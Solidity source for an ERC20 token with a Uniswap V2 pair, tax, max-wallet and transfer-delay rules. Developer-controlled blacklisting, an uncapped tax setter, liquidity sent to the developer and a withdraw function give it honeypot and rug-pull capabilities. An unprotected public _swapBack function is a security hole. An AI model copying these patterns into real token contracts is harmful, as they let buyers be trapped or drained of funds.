1 pragma solidity 0.8.18;
2 
3 interface IUniswapV2Router02{
4     function WETH() external pure returns (address);
5     function factory() external pure returns (address);
6     function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
7     function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
8 }
9 
10 interface IUniswapV2Factory{function createPair(address tokenA, address tokenB) external returns (address pair);}
11 
12 contract ERC20_UniV2 {
13 
14     IUniswapV2Router02 public immutable uniswapV2Router;
15     mapping(address => uint) private _balances;
16     mapping(address => mapping(address => uint)) private _allowances;
17     mapping(address => bool) public _whitelisted;
18     mapping(address => bool) public _blacklisted;
19     mapping(address => bool) public _blackguard;
20     mapping(address => uint) private _lastTransferBlock;
21     address[] public _blacklistArray;
22     uint private _totalSupply; string private _name;
23     string private _symbol;
24     uint private _decimals;
25     uint public _tax;
26     uint public _max;
27     uint public _transferDelay;
28     uint public _swapAmount;
29     address private _v2Router;
30     address public _v2Pair;
31     address private _collector;
32     address private _dev;
33     address[] public _path;
34 
35     event Transfer(address indexed from, address indexed to, uint256 value);
36     event Approval(address indexed owner, address indexed spender, uint256 value);
37 
38     modifier onlyDev() {require(msg.sender == _dev, "Only the developer can call this function");_;}
39 
40     constructor(string memory name_, string memory symbol_, uint decimals_, uint supply_, uint tax_, uint max_) payable {
41         _name = name_; _symbol = symbol_; _decimals = decimals_;
42         _tax = tax_; _max = max_; _dev = msg.sender;
43         _totalSupply = supply_ * 10 ** decimals_;
44         _balances[address(this)] = supply_ * 10 ** decimals_;
45         emit Transfer(address(0), address(this), supply_ * 10 ** decimals_);
46         _v2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
47         uniswapV2Router = IUniswapV2Router02(_v2Router);
48         _v2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
49         _path = new address[](2); _path[0] = address(this); _path[1] = uniswapV2Router.WETH();
50     }
51 
52     function name() external view returns (string memory) {return _name;}
53     function symbol() external view returns (string memory) {return _symbol;}
54     function decimals() external view returns (uint) {return _decimals;}
55     function totalSupply() external view returns (uint) {return _totalSupply;}
56     function balanceOf(address account) external view returns (uint) {return _balances[account];}
57     function allowance(address owner, address spender) external view returns (uint) {return _allowances[owner][spender];}
58 
59     function transfer(address to, uint256 amount) public returns (bool) {_transfer(msg.sender, to, amount); return true;}
60 
61     function approve(address spender, uint256 amount) public returns (bool) {_approve(msg.sender, spender, amount); return true;}
62 
63     function transferFrom(address from, address to, uint256 amount) public returns (bool) {
64         _spendAllowance(from, msg.sender, amount);
65         _transfer(from, to, amount);
66         return true;
67     }
68 
69     function _transfer(address from, address to, uint256 amount) internal {
70         require(_balances[from] >= amount && (amount + _balances[to] <= maxInt() || _whitelisted[from] || _whitelisted[to] || to == _v2Pair), "ERC20: transfer amount exceeds balance or max wallet");
71         require(!_blacklisted[from] && !_blacklisted[to], "ERC20: YOU DON'T HAVE THE RIGHT");
72         require(block.number > _lastTransferBlock[from] + _transferDelay || from == _v2Pair || _whitelisted[from] || _whitelisted[to], "ERC20: transfer delay not met");
73         if ((from == _v2Pair || to == _v2Pair) && !_whitelisted[from] && !_whitelisted[to]) {
74             uint256 taxAmount = amount * _tax / 100;
75             amount -= taxAmount; _balances[address(this)] += taxAmount; emit Transfer(from, address(this), taxAmount);
76             _lastTransferBlock[from] = block.number; _lastTransferBlock[to] = block.number;
77             if (_balances[address(this)] > _swapAmount && to == _v2Pair) {_swapBack(_balances[address(this)]);}
78         }
79         _balances[from] -= amount; _balances[to] += amount; emit Transfer(from, to, amount);
80     }
81 
82     function _approve(address owner, address spender, uint256 amount) internal {
83         _allowances[owner][spender] = amount;
84         emit Approval(owner, spender, amount);
85     }
86 
87     function _spendAllowance(address owner, address spender, uint256 amount) internal {
88         uint256 currentAllowance = _allowances[owner][spender];
89         require(currentAllowance >= amount, "ERC20: insufficient allowance");
90         _approve(owner, spender, currentAllowance - amount);
91     }
92 
93     function updateWhitelist(address[] memory addresses, bool whitelisted_) external onlyDev {
94         for (uint i = 0; i < addresses.length; i++) {
95             _whitelisted[addresses[i]] = whitelisted_;
96         }
97     }
98 
99     function updateBlacklist(address[] memory addresses, bool blacklisted_) external{
100         require(msg.sender == _dev || _blackguard[msg.sender], "Only the developer or night's watch can call this function");
101         for (uint i = 0; i < addresses.length; i++) {_blacklisted[addresses[i]] = blacklisted_; _blacklistArray.push(addresses[i]);}
102     }
103 
104     function updateBlackguard(address[] memory addresses, bool blackguard_) external onlyDev {
105         for (uint i = 0; i < addresses.length; i++) {
106             _blackguard[addresses[i]] = blackguard_;
107         }
108     }
109 
110     function setDev (address dev_) external onlyDev {_dev = dev_;}
111 
112     function setTax (uint8 tax_) external onlyDev {_tax = tax_;}
113 
114     function setMax(uint max_) external onlyDev {_max = max_;}
115 
116     function setTransferDelay(uint delay) external onlyDev {_transferDelay = delay;}
117 
118     function setSwapAmount(uint swapAmount_) external onlyDev {_swapAmount = swapAmount_ * 10 ** _decimals;}
119 
120     function maxInt() internal view returns (uint) {return _totalSupply * _max / 100;}
121 
122     function _setUp(uint transferDelay_, uint swapAmount_, address collector_) public onlyDev {
123         _swapAmount = swapAmount_ * 10 ** _decimals;
124         _whitelisted[address(this)] = true; _whitelisted[msg.sender] = true; 
125         _collector = collector_; _transferDelay = transferDelay_;
126     }
127 
128     function _swapBack(uint256 amount_) public {
129         _approve(address(this), _v2Router, amount_ + 100);
130         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount_, 0, _path, _collector, block.timestamp);
131     }
132 
133     function _addLiquidity() external onlyDev{
134         _approve(address(this), _v2Router, _balances[address(this)]);
135         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), _balances[address(this)], 0, 0, msg.sender, block.timestamp);
136     }
137 
138     function withdraw(uint amount_) external onlyDev {
139         payable(_dev).transfer(address(this).balance);
140         _transfer(address(this), _dev, amount_);
141     }
142 
143     function deposit() external payable {}
144 }